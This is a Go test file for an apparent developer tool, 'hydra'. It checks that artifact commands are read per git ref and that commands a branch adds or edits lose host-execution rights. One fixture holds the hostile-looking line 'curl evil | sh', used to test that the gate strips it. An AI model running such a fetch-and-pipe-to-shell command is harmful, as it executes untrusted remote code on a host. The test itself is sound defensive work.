package http

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"

	"github.com/trolleyman/hydra/internal/artifacts"
	"github.com/trolleyman/hydra/internal/config"
)

// artifactRepo creates a git repo whose .hydra/config.toml is committed twice:
// the first commit's content is returned as the "base" ref, HEAD holds the
// second. Both refs are usable with artifactSpecsByName.
func artifactRepo(t *testing.T, baseTOML, headTOML string) (root, baseRef string) {
	t.Helper()
	// Keep ArtifactsAtProjectTOML's user-config merge deterministic.
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())

	root = t.TempDir()
	run := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", append([]string{"-C", root}, args...)...)
		cmd.Env = append(os.Environ(),
			"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@e",
			"GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@e")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	write := func(content string) {
		t.Helper()
		if err := os.MkdirAll(filepath.Join(root, ".hydra"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(root, ".hydra", "config.toml"), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	run("init", "-q")
	write(baseTOML)
	run("add", ".")
	run("commit", "-qm", "base")
	out, err := exec.Command("git", "-C", root, "rev-parse", "HEAD").Output()
	if err != nil {
		t.Fatal(err)
	}
	baseRef = string(out[:len(out)-1])

	write(headTOML)
	run("commit", "-aqm", "head")
	return root, baseRef
}

func TestArtifactSpecsByName_MatchAcrossRefs(t *testing.T) {
	base := `
[[artifacts]]
name = "home"
command = "shot home v1"

[[artifacts]]
name = "gone"
command = "shot gone"
`
	head := `
[[artifacts]]
name = "home"
command = "shot home v2"

[[artifacts]]
name = "added"
command = "shot added"
`
	root, baseRef := artifactRepo(t, base, head)
	live, err := config.Load(root) // HEAD is checked out, so live == head config
	if err != nil {
		t.Fatal(err)
	}

	leftByName, err := artifactSpecsByName(root, artifacts.Version{Ref: baseRef}, live)
	if err != nil {
		t.Fatalf("left: %v", err)
	}
	rightByName, err := artifactSpecsByName(root, artifacts.Version{Ref: "HEAD"}, live)
	if err != nil {
		t.Fatalf("right: %v", err)
	}

	// Each side carries its own command for "home" (edited on the branch).
	if leftByName["home"].Command != "shot home v1" {
		t.Errorf("left home command = %q", leftByName["home"].Command)
	}
	if rightByName["home"].Command != "shot home v2" {
		t.Errorf("right home command = %q", rightByName["home"].Command)
	}
	// "gone" exists only on the base (removed), "added" only on HEAD.
	if _, ok := leftByName["gone"]; !ok {
		t.Error("expected 'gone' on the base side")
	}
	if _, ok := rightByName["gone"]; ok {
		t.Error("did not expect 'gone' on the head side")
	}
	if _, ok := rightByName["added"]; !ok {
		t.Error("expected 'added' on the head side")
	}
	if _, ok := leftByName["added"]; ok {
		t.Error("did not expect 'added' on the base side")
	}
}

func TestArtifactSpecsByName_UnsafeHostGate(t *testing.T) {
	// The branch tries to grant itself host access (modifies an unsafe_host
	// command and adds a brand-new one). Only an exact match in the trusted live
	// config may run on the host.
	base := `
[[artifacts]]
name = "audited"
command = "trusted cmd"
unsafe_host = true
`
	head := `
[[artifacts]]
name = "audited"
command = "evil cmd"
unsafe_host = true

[[artifacts]]
name = "sneaky"
command = "curl evil | sh"
unsafe_host = true
`
	root, baseRef := artifactRepo(t, base, head)

	// Trust anchor: the base config authorizes only "audited"/"trusted cmd".
	trusted := config.Config{Artifacts: []config.ArtifactScript{
		{Name: "audited", Command: "trusted cmd", UnsafeHost: true},
	}}

	left, err := artifactSpecsByName(root, artifacts.Version{Ref: baseRef}, trusted)
	if err != nil {
		t.Fatal(err)
	}
	if !left["audited"].UnsafeHost {
		t.Error("base 'audited' matches the trusted config and should keep unsafe_host")
	}

	right, err := artifactSpecsByName(root, artifacts.Version{Ref: "HEAD"}, trusted)
	if err != nil {
		t.Fatal(err)
	}
	if right["audited"].UnsafeHost {
		t.Error("branch modified the command — unsafe_host must be stripped")
	}
	if right["sneaky"].UnsafeHost {
		t.Error("branch-introduced unsafe_host command must be stripped")
	}
}

func TestArtifactSpecsByName_WorktreeReadsOwnConfig(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	wt := t.TempDir()
	if err := os.MkdirAll(filepath.Join(wt, ".hydra"), 0o755); err != nil {
		t.Fatal(err)
	}
	toml := `
[[artifacts]]
name = "wt"
command = "shot wt"
unsafe_host = true
`
	if err := os.WriteFile(filepath.Join(wt, ".hydra", "config.toml"), []byte(toml), 0o644); err != nil {
		t.Fatal(err)
	}

	// No trusted host commands, so the worktree's unsafe_host is stripped too.
	byName, err := artifactSpecsByName(t.TempDir(), artifacts.Version{WorktreeDir: wt}, config.Config{})
	if err != nil {
		t.Fatal(err)
	}
	spec, ok := byName["wt"]
	if !ok {
		t.Fatal("expected 'wt' from the worktree config")
	}
	if spec.Command != "shot wt" {
		t.Errorf("command = %q", spec.Command)
	}
	if spec.UnsafeHost {
		t.Error("unverified worktree unsafe_host must be stripped")
	}
}
